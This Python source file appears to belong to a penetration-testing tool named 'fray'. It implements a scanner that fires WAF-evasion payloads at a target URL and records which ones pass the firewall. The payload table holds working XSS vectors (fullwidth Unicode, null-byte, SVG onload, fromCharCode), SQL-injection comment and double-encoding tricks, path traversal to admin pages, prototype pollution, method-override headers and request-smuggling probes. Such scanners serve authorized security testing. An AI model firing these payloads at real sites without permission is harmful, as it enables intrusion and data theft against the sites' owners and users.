#!/usr/bin/env python3
"""
Modern WAF Bypass Scanner — tests evasion techniques that defeat modern WAFs
without triggering classic signature matches.

Techniques covered:
  - Unicode normalization / homoglyph substitution
  - HTTP/2 header smuggling indicators
  - Case variation + whitespace obfuscation
  - Null byte / comment injection
  - Double encoding / over-encoding
  - HTTP verb tampering
  - JSON/XML parameter confusion
  - Prototype pollution via query string
  - Path traversal normalization bypass
  - Host header injection for cache poisoning
  - Chunked encoding abuse
  - Request smuggling indicators (CL.TE / TE.CL)
"""

from __future__ import annotations

import re
import socket
import ssl
import time
import urllib.parse
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple


# ── Probe categories ─────────────────────────────────────────────────────

# Each probe: (technique, payload, expected_indicator, description, severity)
_BYPASS_PROBES: List[Tuple[str, str, str, str, str]] = [

    # ── Unicode / Homoglyph ──
    ("unicode_normalization",
     "\uff1cscript\uff1ealert(1)\uff1c/script\uff1e",
     "alert(1)|<script",
     "Fullwidth Unicode tag bypass (<script> via ＜ＳＣＲＩＰＴｓ＞)",
     "high"),

    ("unicode_normalization",
     "%ef%bc%9cscript%ef%bc%9ealert(1)%ef%bc%9c/script%ef%bc%9e",
     "alert(1)|script",
     "URL-encoded fullwidth Unicode script tag",
     "high"),

    # ── Case variation ──
    ("case_variation",
     "<ScRiPt>alert(1)</ScRiPt>",
     "alert(1)",
     "Mixed case script tag",
     "medium"),

    ("case_variation",
     "<IMG SRC=x OnErRoR=alert(1)>",
     "alert(1)",
     "Mixed case event handler",
     "medium"),

    # ── Null byte injection ──
    ("null_byte",
     "<scr\x00ipt>alert(1)</scr\x00ipt>",
     "alert(1)",
     "Null byte mid-tag injection",
     "high"),

    ("null_byte",
     "' OR 1=1\x00--",
     "200|sql|error",
     "Null byte SQLi terminator",
     "high"),

    # ── HTML comment obfuscation ──
    ("comment_injection",
     "<scr<!---->ipt>alert(1)</scr<!---->ipt>",
     "alert(1)",
     "HTML comment injection inside script tag",
     "medium"),

    ("comment_injection",
     "UNI/**/ON SEL/**/ECT 1,2,3--",
     "200|column|error",
     "SQL comment injection between keywords",
     "high"),

    # ── Double encoding ──
    ("double_encoding",
     "%253cscript%253ealert(1)%253c/script%253e",
     "alert(1)|script",
     "Double URL-encoded script tag (%3c → %253c)",
     "high"),

    ("double_encoding",
     "%2527 OR %25271%2527=%25271",
     "200|sql|error",
     "Double-encoded SQLi quote bypass",
     "high"),

    # ── HTTP verb tampering ──
    ("verb_tampering",
     "X-HTTP-Method-Override: DELETE",
     "200|204|deleted",
     "Method override header — DELETE via GET/POST",
     "medium"),

    ("verb_tampering",
     "X-Method-Override: PUT",
     "200|updated",
     "X-Method-Override: PUT",
     "medium"),

    # ── JSON parameter pollution ──
    ("parameter_pollution",
     '{"role":"user","role":"admin"}',
     "admin|200",
     "Duplicate JSON key pollution (last-wins parsers)",
     "high"),

    ("parameter_pollution",
     "param=val1&param=val2",
     "200",
     "HTTP parameter pollution — same param twice",
     "medium"),

    # ── Path traversal normalization ──
    ("path_normalization",
     "/../admin",
     "admin|200|302",
     "Path traversal normalization bypass",
     "high"),

    ("path_normalization",
     "/./admin",
     "admin|200",
     "Dot-slash path normalization",
     "medium"),

    ("path_normalization",
     "/%2e%2e/admin",
     "admin|200|302",
     "URL-encoded path traversal",
     "high"),

    # ── Prototype pollution ──
    ("prototype_pollution",
     "__proto__[admin]=true",
     "admin|true|200",
     "Prototype pollution via query string",
     "high"),

    ("prototype_pollution",
     "constructor[prototype][admin]=true",
     "admin|true|200",
     "Constructor prototype pollution",
     "high"),

    # ── Request smuggling indicators ──
    ("request_smuggling",
     "Transfer-Encoding: chunked",
     "200|timeout|desync",
     "CL.TE smuggling probe — inject TE header with Content-Length",
     "critical"),

    # ── WAF evasion with encoding ──
    ("encoding_bypass",
     "<svg/onload=alert(1)>",
     "alert(1)|onload",
     "SVG onload without space (bypasses space-required signatures)",
     "high"),

    ("encoding_bypass",
     "<svg onload=&#97;&#108;&#101;&#114;&#116;(1)>",
     "alert|onload",
     "HTML entity encoded JS in event handler",
     "high"),

    ("encoding_bypass",
     "';alert(String.fromCharCode(88,83,83))//",
     "alert|XSS|88",
     "fromCharCode obfuscation",
     "medium"),

    # ── Chunked body bypass ──
    ("chunked_encoding",
     "3\r\nabc\r\n0\r\n\r\n",
     "200",
     "Chunked body probe — some WAFs fail to reassemble",
     "medium"),

    # ── HPP with arrays ──
    ("hpp_array",
     "id[]=1&id[]=2",
     "200|error",
     "PHP-style array parameter pollution",
     "medium"),

    ("hpp_array",
     "ids[0]=1&ids[1]=2",
     "200",
     "Indexed array parameter pollution",
     "low"),
]


# ── Result types ─────────────────────────────────────────────────────────

@dataclass
class BypassFinding:
    technique: str
    payload: str
    description: str
    severity: str
    evidence: str = ""
    status_code: int = 0


@dataclass
class ModernBypassResult:
    vulnerable: bool = False
    findings: List[BypassFinding] = field(default_factory=list)
    techniques_bypassed: List[str] = field(default_factory=list)
    requests: int = 0
    target: str = ""
    error: str = ""


# ── Scanner ───────────────────────────────────────────────────────────────

class ModernBypassScanner:
    """Modern WAF bypass technique scanner.

    Tests evasion techniques that defeat regex-based WAF signatures.

    Usage:
        scanner = ModernBypassScanner("https://example.com/search", param="q")
        result  = scanner.scan()
    """

    def __init__(self, url: str,
                 param: str = "q",
                 timeout: int = 8,
                 verify_ssl: bool = True,
                 cookie: str = "",
                 custom_headers: Optional[Dict[str, str]] = None,
                 waf_vendor: str = ""):
        self.url = url
        self.param = param
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.cookie = cookie
        self.custom_headers = custom_headers or {}
        self.waf_vendor = waf_vendor.lower()

        parsed = urllib.parse.urlparse(url)
        self._scheme = parsed.scheme or "https"
        self._host = parsed.hostname or ""
        self._port = parsed.port or (443 if self._scheme == "https" else 80)
        self._path = parsed.path or "/"
        self._orig_query = dict(urllib.parse.parse_qsl(parsed.query))
        self._use_ssl = self._scheme == "https"
        self._requests = 0

    def _request(self, payload: str,
                 extra_headers: Optional[Dict[str, str]] = None,
                 method: str = "GET",
                 body: str = "") -> Tuple[int, str]:
        """Send a single request. Returns (status_code, body_snippet)."""
        self._requests += 1

        params = dict(self._orig_query)
        if method == "GET" and not extra_headers:
            params[self.param] = payload
            qs = urllib.parse.urlencode(params, quote_via=urllib.parse.quote)
            path = f"{self._path}?{qs}"
            body_bytes = b""
        elif method == "POST":
            path = self._path
            body_bytes = (body or urllib.parse.urlencode({self.param: payload})).encode("utf-8")
        else:
            path = self._path
            body_bytes = b""

        hdrs: Dict[str, str] = {
            "Host": self._host,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Accept": "*/*",
            "Connection": "close",
        }
        if body_bytes:
            hdrs["Content-Type"] = "application/x-www-form-urlencoded"
            hdrs["Content-Length"] = str(len(body_bytes))
        if self.cookie:
            hdrs["Cookie"] = self.cookie
        if extra_headers:
            hdrs.update(extra_headers)
        hdrs.update(self.custom_headers)

        hdr_str = "".join(f"{k}: {v}\r\n" for k, v in hdrs.items())
        req = f"{method} {path} HTTP/1.1\r\n{hdr_str}\r\n"

        try:
            sock = socket.create_connection((self._host, self._port), timeout=self.timeout)
            if self._use_ssl:
                ctx = ssl.create_default_context()
                if not self.verify_ssl:
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=self._host)
            sock.sendall(req.encode("utf-8", errors="replace"))
            if body_bytes:
                sock.sendall(body_bytes)
            resp = b""
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                resp += chunk
                if len(resp) > 65536:
                    break
            sock.close()
        except Exception:
            return 0, ""

        resp_str = resp.decode("utf-8", errors="replace")
        status = 0
        m = re.search(r"HTTP/[\d.]+ (\d+)", resp_str)
        if m:
            status = int(m.group(1))
        body_text = resp_str.split("\r\n\r\n", 1)[1][:500] if "\r\n\r\n" in resp_str else ""
        return status, body_text

    def _baseline_blocked(self, payload: str = "<script>alert(1)</script>") -> bool:
        """Check if the WAF blocks a known-bad payload (used as sanity check)."""
        status, _ = self._request(payload)
        return status in (403, 406, 429, 503)

    def scan(self) -> ModernBypassResult:
        result = ModernBypassResult(target=self.url)

        # Baseline: is there even a WAF present?
        waf_active = self._baseline_blocked()

        seen_techniques: set = set()

        for technique, payload, indicator_pattern, description, severity in _BYPASS_PROBES:
            # Header injection probes — send as header, not query param
            if technique == "verb_tampering" or technique == "request_smuggling":
                header_name, header_val = payload.split(": ", 1)
                status, body = self._request(
                    "fray_test",
                    extra_headers={header_name.strip(): header_val.strip()},
                )
            elif technique == "parameter_pollution" and payload.startswith("{"):
                # JSON body probe
                status, body = self._request(
                    payload,
                    method="POST",
                    body=payload,
                    extra_headers={"Content-Type": "application/json"},
                )
            elif technique == "chunked_encoding":
                status, body = self._request(
                    payload,
                    extra_headers={"Transfer-Encoding": "chunked"},
                    method="POST",
                    body=payload,
                )
            else:
                status, body = self._request(payload)

            if status == 0:
                continue

            # A bypass is indicated when:
            # 1. The WAF is active (blocks plain payloads)
            # 2. This obfuscated probe got through (status != blocked)
            # 3. The response contains expected output OR the WAF didn't block it
            not_blocked = status not in (403, 406, 429, 503)
            indicator_found = bool(re.search(indicator_pattern, body, re.I))

            if waf_active and not_blocked:
                evidence = body[:120] if body else f"HTTP {status}"
                result.vulnerable = True
                result.findings.append(BypassFinding(
                    technique=technique,
                    payload=payload[:100],
                    description=description,
                    severity=severity,
                    evidence=evidence,
                    status_code=status,
                ))
                if technique not in seen_techniques:
                    seen_techniques.add(technique)
                    result.techniques_bypassed.append(technique)
            elif indicator_found and not_blocked:
                # No WAF but payload reflected/executed
                result.vulnerable = True
                result.findings.append(BypassFinding(
                    technique=technique,
                    payload=payload[:100],
                    description=description + " (no WAF — payload reflected)",
                    severity=severity,
                    evidence=body[:120],
                    status_code=status,
                ))

        result.requests = self._requests

        # ── Adaptive cache: record confirmed bypasses ─────────────────────
        try:
            from fray.adaptive_cache import save_scan_results, _extract_domain
            _domain = _extract_domain(self.url)
            _cache = [
                {"payload": f.payload, "blocked": False,
                 "category": "modern_bypasses",
                 "bypass_confidence": 75 if f.severity in ("critical", "high") else 50}
                for f in result.findings
            ]
            if _cache:
                save_scan_results(_cache, domain=_domain, waf_vendor=self.waf_vendor)
        except Exception:
            pass

        return result


def print_bypass_result(result: ModernBypassResult) -> None:
    """Print ModernBypassResult to stdout."""
    if result.error:
        print(f"[!] Error: {result.error}")
        return
    if result.vulnerable:
        print(f"[!] WAF bypasses found on {result.target}")
        print(f"  Techniques: {', '.join(result.techniques_bypassed)}")
        for f in result.findings:
            print(f"  [{f.severity.upper()}] {f.technique}: {f.description}")
            if f.evidence:
                print(f"    Evidence: {f.evidence[:80]}")
    else:
        print(f"[OK] No bypass techniques confirmed on {result.target}")
    print(f"  Requests: {result.requests}")
